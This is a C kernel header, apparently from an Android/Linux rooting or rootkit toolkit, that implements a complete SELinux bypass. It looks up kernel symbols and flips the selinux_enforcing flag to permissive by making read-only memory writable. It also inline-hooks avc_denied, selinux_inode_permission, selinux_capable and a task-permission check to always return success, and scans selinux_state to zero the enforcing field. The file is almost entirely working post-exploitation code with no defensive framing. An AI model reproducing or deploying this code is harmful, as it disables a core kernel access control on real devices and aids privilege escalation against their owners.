/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_SELINUX_H
#define NVK_SELINUX_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/kallsyms.h>
#include <nvk_mem.h>
#include <nvk_hook.h>

static volatile int *_nvk_selinux_enforcing;
static int _nvk_selinux_inited;

static int nvk_selinux_init(void)
{
	if (_nvk_selinux_inited) return 0;

	if (!_nvk_mem_inited)
		nvk_mem_init();

	_nvk_selinux_enforcing =
		(volatile int *)NVK_LOOKUP("selinux_enforcing");

	_nvk_selinux_inited = 1;
	return _nvk_selinux_enforcing ? 0 : -1;
}

static __always_inline int nvk_selinux_is_enforcing(void)
{
	if (!_nvk_selinux_enforcing) return -1;
	return __atomic_load_n(_nvk_selinux_enforcing, __ATOMIC_ACQUIRE);
}

static int nvk_selinux_set_permissive(void)
{
	if (!_nvk_selinux_enforcing) return -1;
	if (nvk_mem_make_rw((unsigned long)_nvk_selinux_enforcing) < 0)
		return -2;
	*(volatile int *)_nvk_selinux_enforcing = 0;
	__asm__ __volatile__("dsb ish" ::: "memory");
	nvk_mem_make_ro((unsigned long)_nvk_selinux_enforcing);
	return 0;
}

static int nvk_selinux_set_enforcing(void)
{
	if (!_nvk_selinux_enforcing) return -1;
	if (nvk_mem_make_rw((unsigned long)_nvk_selinux_enforcing) < 0)
		return -2;
	*(volatile int *)_nvk_selinux_enforcing = 1;
	__asm__ __volatile__("dsb ish" ::: "memory");
	nvk_mem_make_ro((unsigned long)_nvk_selinux_enforcing);
	return 0;
}


typedef long (*nvk_selinux_generic_fn)(void);
typedef int (*nvk_inode_permission_fn)(void *inode, int mask);

static struct nvk_hook _nvk_avc_hook;
static nvk_selinux_generic_fn _nvk_orig_avc;

static struct nvk_hook _nvk_inode_hook;
static nvk_inode_permission_fn _nvk_orig_inode_perm;

static struct nvk_hook _nvk_task_perm_hook;
static nvk_selinux_generic_fn _nvk_orig_task_perm;

static struct nvk_hook _nvk_cred_perm_hook;
static nvk_selinux_generic_fn _nvk_orig_cred_perm;

struct nvk_selinux_bypass {
	int avc_hooked;
	int inode_hooked;
	int task_perm_hooked;
	int cred_perm_hooked;
	int state_patched;
	int saved_enforce;
};

static long _nvk_return_zero(void)
{
	return 0;
}

static int nvk_selinux_bypass_install(struct nvk_selinux_bypass *state)
{
	void *target;
	int ret;

	state->avc_hooked = 0;
	state->inode_hooked = 0;
	state->task_perm_hooked = 0;
	state->cred_perm_hooked = 0;
	state->state_patched = 0;

	target = NVK_LOOKUP("avc_denied");
	if (target) {
		ret = nvk_hook_install(&_nvk_avc_hook, target,
				       (void *)_nvk_return_zero,
				       (void **)&_nvk_orig_avc);
		if (ret == 0)
			state->avc_hooked = 1;
	}

	target = NVK_LOOKUP("selinux_inode_permission");
	if (target) {
		ret = nvk_hook_install(&_nvk_inode_hook, target,
				       (void *)_nvk_return_zero,
				       (void **)&_nvk_orig_inode_perm);
		if (ret == 0)
			state->inode_hooked = 1;
	}

	target = NVK_LOOKUP("selinux_task_setpgid");
	if (!target)
		target = NVK_LOOKUP("selinux_task_kill");
	if (target) {
		ret = nvk_hook_install(&_nvk_task_perm_hook, target,
				       (void *)_nvk_return_zero,
				       (void **)&_nvk_orig_task_perm);
		if (ret == 0)
			state->task_perm_hooked = 1;
	}

	target = NVK_LOOKUP("selinux_capable");
	if (target) {
		ret = nvk_hook_install(&_nvk_cred_perm_hook, target,
				       (void *)_nvk_return_zero,
				       (void **)&_nvk_orig_cred_perm);
		if (ret == 0)
			state->cred_perm_hooked = 1;
	}

	return (state->avc_hooked || state->inode_hooked) ? 0 : -1;
}

static unsigned long _nvk_se_patched_addr;

static int nvk_selinux_patch_state(struct nvk_selinux_bypass *state)
{
	void *se_state = NVK_LOOKUP("selinux_state");
	if (!se_state) return -1;

	if (_nvk_selinux_enforcing) {
		int cur = *_nvk_selinux_enforcing;
		state->saved_enforce = cur;
		if (cur == 1) {
			_nvk_se_patched_addr =
				(unsigned long)_nvk_selinux_enforcing;
			nvk_mem_write_protected(_nvk_se_patched_addr,
						&(int){0}, 4);
			state->state_patched = 1;
			return 0;
		}
		return 0;
	}

	const unsigned char *p = (const unsigned char *)se_state;
	unsigned long i;
	int enforce_off = 0;

	/*
	 * selinux_state layout: { bool initialized; bool enforcing; ... }
	 * On most kernels `initialized` is 1 and `enforcing` is 0 or 1.
	 * We look for the pattern: {1, 0|1} at a 4-byte aligned offset.
	 */
	for (i = 0; i < 32; i += 4) {
		int v;
		if (nvk_mem_read(&v, p + i, 4)) continue;
		if (v == 1) {
			int next;
			if (nvk_mem_read(&next, p + i + 4, 4)) continue;
			if (next == 0 || next == 1) {
				enforce_off = (int)(i + 4);
				break;
			}
		}
	}

	int cur;
	if (nvk_mem_read(&cur, p + enforce_off, 4))
		return -2;

	state->saved_enforce = cur;
	if (cur == 1) {
		_nvk_se_patched_addr = (unsigned long)(p + enforce_off);
		nvk_mem_write_protected(_nvk_se_patched_addr, &(int){0}, 4);
		state->state_patched = 1;
	}
	return 0;
}

static void nvk_selinux_restore_state(struct nvk_selinux_bypass *state)
{
	if (!state->state_patched) return;
	if (!_nvk_se_patched_addr) return;

	nvk_mem_write_protected(_nvk_se_patched_addr,
				&state->saved_enforce, 4);
	state->state_patched = 0;
	_nvk_se_patched_addr = 0;
}

static int nvk_selinux_full_bypass(struct nvk_selinux_bypass *state)
{
	int ret;

	ret = nvk_selinux_bypass_install(state);

	nvk_selinux_set_permissive();

	nvk_selinux_patch_state(state);

	return ret;
}

static void nvk_selinux_bypass_remove(struct nvk_selinux_bypass *state)
{
	if (state->state_patched)
		nvk_selinux_restore_state(state);

	if (state->cred_perm_hooked) {
		nvk_hook_remove(&_nvk_cred_perm_hook);
		state->cred_perm_hooked = 0;
	}
	if (state->task_perm_hooked) {
		nvk_hook_remove(&_nvk_task_perm_hook);
		state->task_perm_hooked = 0;
	}
	if (state->inode_hooked) {
		nvk_hook_remove(&_nvk_inode_hook);
		state->inode_hooked = 0;
	}
	if (state->avc_hooked) {
		nvk_hook_remove(&_nvk_avc_hook);
		state->avc_hooked = 0;
	}
}

#endif /* NVK_SELINUX_H */
